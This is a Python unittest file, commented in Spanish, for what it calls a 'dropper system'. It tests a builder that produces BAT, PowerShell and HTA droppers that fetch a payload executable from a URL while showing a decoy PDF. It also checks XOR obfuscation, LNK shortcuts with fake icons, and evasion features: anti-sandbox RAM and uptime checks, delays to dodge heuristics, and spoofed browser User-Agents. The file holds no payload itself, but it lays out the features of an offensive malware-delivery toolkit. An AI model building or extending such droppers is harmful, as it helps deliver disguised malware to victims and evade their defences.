#!/usr/bin/env python3
"""
========================================================================
PRUEBAS UNITARIAS - Sistema de Droppers
========================================================================
Valida la funcionalidad de todos los componentes del sistema de droppers

EJECUCIÓN:
    pytest test_droppers.py -v
    python test_droppers.py  (sin pytest)

COBERTURA:
    pytest test_droppers.py --cov=. --cov-report=html
========================================================================
"""

import unittest
import os
import tempfile
import shutil
from pathlib import Path
import subprocess
import sys

# Añadir directorio actual al path para importar builder
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    import builder
except ImportError:
    print("[!] No se pudo importar builder.py")
    builder = None

class TestDropperBuilder(unittest.TestCase):
    """Pruebas para el builder.py"""
    
    def setUp(self):
        """Preparar entorno de pruebas"""
        self.test_dir = tempfile.mkdtemp()
        self.test_agent = os.path.join(self.test_dir, 'test_agent.exe')
        
        # Crear un agente fake para pruebas
        with open(self.test_agent, 'wb') as f:
            f.write(b'MZ' + b'\x00' * 1000)  # Simular un EXE con header MZ
    
    def tearDown(self):
        """Limpiar después de las pruebas"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_generate_random_name(self):
        """Verificar que los nombres aleatorios son únicos"""
        if builder is None:
            self.skipTest("builder.py no disponible")
        
        names = set()
        for _ in range(100):
            name = builder.generate_random_name(8)
            self.assertEqual(len(name), 8)
            self.assertTrue(name.isalnum())
            names.add(name)
        
        # Verificar que al menos 95 de 100 nombres son únicos
        self.assertGreater(len(names), 95)
    
    def test_xor_encrypt_decrypt(self):
        """Verificar que XOR encryption/decryption funciona correctamente"""
        if builder is None:
            self.skipTest("builder.py no disponible")
        
        original_data = b"Datos secretos para encriptar"
        key = "clave_secreta"
        
        # Encriptar
        encrypted = builder.xor_encrypt(original_data, key)
        
        # Verificar que los datos cambiaron
        self.assertNotEqual(original_data, encrypted)
        
        # Desencriptar
        decrypted = builder.xor_encrypt(encrypted, key)
        
        # Verificar que se recuperan los datos originales
        self.assertEqual(original_data, decrypted)
    
    def test_build_bat_dropper(self):
        """Verificar que el dropper BAT se genera correctamente"""
        if builder is None:
            self.skipTest("builder.py no disponible")
        
        output_file = os.path.join(self.test_dir, 'test_dropper.bat')
        payload_url = "http://test.com/payload.exe"
        
        builder.build_bat_dropper(
            self.test_agent,
            output_file,
            payload_url
        )
        
        # Verificar que el archivo fue creado
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
            self.assertIn(payload_url, content)
            self.assertIn('powershell', content.lower())
            self.assertIn('PDF', content)
    
    def test_build_ps1_dropper(self):
        """Verificar que el dropper PowerShell se genera correctamente"""
        if builder is None:
            self.skipTest("builder.py no disponible")
        
        output_file = os.path.join(self.test_dir, 'test_dropper.ps1')
        decoy_url = "http://test.com/documento.pdf"
        xor_key = "test_key_123"
        
        builder.build_ps1_dropper(
            self.test_agent,
            output_file,
            decoy_url,
            xor_key
        )
        
        # Verificar que el archivo fue creado
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
            self.assertIn(decoy_url, content)
            self.assertIn(xor_key, content)
            self.assertIn('Get-WmiObject', content)  # Anti-sandbox check
    
    def test_build_hta_dropper(self):
        """Verificar que el dropper HTA se genera correctamente"""
        if builder is None:
            self.skipTest("builder.py no disponible")
        
        output_file = os.path.join(self.test_dir, 'test_dropper.hta')
        payload_url = "http://test.com/payload.exe"
        decoy_url = "http://test.com/documento.pdf"
        
        builder.build_hta_dropper(
            self.test_agent,
            output_file,
            payload_url,
            decoy_url
        )
        
        # Verificar que el archivo fue creado
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
            self.assertIn(payload_url, content)
            self.assertIn(decoy_url, content)
            self.assertIn('<HTA:APPLICATION', content)
            self.assertIn('vbscript', content.lower())

class TestDropperScripts(unittest.TestCase):
    """Pruebas para los scripts de dropper"""
    
    def setUp(self):
        """Preparar entorno de pruebas"""
        self.test_dir = tempfile.mkdtemp()
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
    
    def tearDown(self):
        """Limpiar después de las pruebas"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_bat_dropper_syntax(self):
        """Verificar que el BAT dropper tiene sintaxis válida"""
        bat_path = os.path.join(self.script_dir, 'simple_dropper.bat')
        
        if not os.path.exists(bat_path):
            self.skipTest("simple_dropper.bat no encontrado")
        
        # Leer contenido
        with open(bat_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Verificar elementos clave
        self.assertIn('@echo off', content)
        self.assertIn('set', content)
        self.assertIn('powershell', content.lower())
        self.assertIn('%TEMP%', content)
        
        # Verificar que no tiene errores de sintaxis obvios
        self.assertNotIn('syntax error', content.lower())
    
    def test_ps1_dropper_syntax(self):
        """Verificar que el PowerShell dropper tiene sintaxis válida"""
        ps1_path = os.path.join(self.script_dir, 'advanced_dropper.ps1')
        
        if not os.path.exists(ps1_path):
            self.skipTest("advanced_dropper.ps1 no encontrado")
        
        # Intentar validar sintaxis con PowerShell (solo en Windows)
        if os.name == 'nt':
            try:
                result = subprocess.run(
                    ['powershell', '-NoProfile', '-Command', 
                     f'Get-Command -Syntax (Get-Content "{ps1_path}" -Raw)'],
                    capture_output=True,
                    timeout=5
                )
                # Si no hay errores graves, el script es válido
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass  # PowerShell no disponible o timeout
    
    def test_lnk_generator_exists(self):
        """Verificar que el generador de LNK existe"""
        lnk_gen_path = os.path.join(self.script_dir, 'generate_lnk.ps1')
        self.assertTrue(os.path.exists(lnk_gen_path), 
                       "generate_lnk.ps1 debe existir")
        
        # Verificar contenido básico
        with open(lnk_gen_path, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn('WScript.Shell', content)
            self.assertIn('CreateShortcut', content)
            self.assertIn('IconLocation', content)

class TestIconHandling(unittest.TestCase):
    """Pruebas para el manejo de iconos"""
    
    def setUp(self):
        """Preparar entorno de pruebas"""
        self.test_dir = tempfile.mkdtemp()
    
    def tearDown(self):
        """Limpiar después de las pruebas"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_icon_download_script_exists(self):
        """Verificar que el script de descarga de iconos existe"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        icon_script = os.path.join(script_dir, 'download_icon.py')
        
        self.assertTrue(os.path.exists(icon_script),
                       "download_icon.py debe existir")
    
    def test_icon_types_defined(self):
        """Verificar que hay iconos definidos"""
        try:
            import download_icon
            self.assertIsInstance(download_icon.ICON_URLS, dict)
            self.assertGreater(len(download_icon.ICON_URLS), 0)
            self.assertIn('pdf', download_icon.ICON_URLS)
        except ImportError:
            self.skipTest("download_icon.py no se pudo importar")

class TestBuildIntegration(unittest.TestCase):
    """Pruebas de integración con el build system"""
    
    def test_build_script_exists(self):
        """Verificar que build.rs existe en el proyecto agent"""
        build_rs = Path(__file__).parent.parent / 'agent' / 'build.rs'
        self.assertTrue(build_rs.exists(), 
                       "agent/build.rs debe existir")
        
        # Verificar contenido
        content = build_rs.read_text(encoding='utf-8')
        self.assertIn('winres', content)
        self.assertIn('set_icon', content)
    
    def test_cargo_toml_has_winres(self):
        """Verificar que Cargo.toml incluye winres"""
        cargo_toml = Path(__file__).parent.parent / 'agent' / 'Cargo.toml'
        
        if not cargo_toml.exists():
            self.skipTest("Cargo.toml no encontrado")
        
        content = cargo_toml.read_text(encoding='utf-8')
        self.assertIn('winres', content)

class TestSecurityFeatures(unittest.TestCase):
    """Pruebas de características de seguridad y evasión"""
    
    def test_dropper_has_anti_sandbox(self):
        """Verificar que los droppers tienen anti-sandbox"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        ps1_path = os.path.join(script_dir, 'advanced_dropper.ps1')
        
        if not os.path.exists(ps1_path):
            self.skipTest("advanced_dropper.ps1 no encontrado")
        
        with open(ps1_path, 'r', encoding='utf-8') as f:
            content = f.read()
            
            # Verificar checks anti-sandbox
            self.assertIn('TotalPhysicalMemory', content)  # RAM check
            self.assertIn('LastBootUpTime', content)  # Uptime check
    
    def test_dropper_has_delays(self):
        """Verificar que hay delays para evitar heurísticas"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        bat_path = os.path.join(script_dir, 'simple_dropper.bat')
        
        if not os.path.exists(bat_path):
            self.skipTest("simple_dropper.bat no encontrado")
        
        with open(bat_path, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn('timeout', content.lower())
    
    def test_user_agent_spoofing(self):
        """Verificar que se usan User-Agents legítimos"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        for script in ['simple_dropper.bat', 'advanced_dropper.ps1']:
            script_path = os.path.join(script_dir, script)
            
            if not os.path.exists(script_path):
                continue
            
            with open(script_path, 'r', encoding='utf-8') as f:
                content = f.read()
                if 'WebClient' in content or 'DownloadFile' in content:
                    self.assertIn('User-Agent', content)
                    self.assertIn('Mozilla', content)

def run_tests():
    """Ejecutar todas las pruebas"""
    print("=" * 70)
    print("PRUEBAS UNITARIAS - Sistema de Droppers")
    print("=" * 70)
    print()
    
    # Crear suite de pruebas
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Añadir todas las clases de pruebas
    suite.addTests(loader.loadTestsFromTestCase(TestDropperBuilder))
    suite.addTests(loader.loadTestsFromTestCase(TestDropperScripts))
    suite.addTests(loader.loadTestsFromTestCase(TestIconHandling))
    suite.addTests(loader.loadTestsFromTestCase(TestBuildIntegration))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityFeatures))
    
    # Ejecutar pruebas
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Resumen
    print()
    print("=" * 70)
    print("RESUMEN")
    print("=" * 70)
    print(f"Pruebas ejecutadas: {result.testsRun}")
    print(f"Exitosas: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Fallidas: {len(result.failures)}")
    print(f"Errores: {len(result.errors)}")
    print(f"Saltadas: {len(result.skipped)}")
    
    return result.wasSuccessful()

if __name__ == '__main__':
    success = run_tests()
    sys.exit(0 if success else 1)
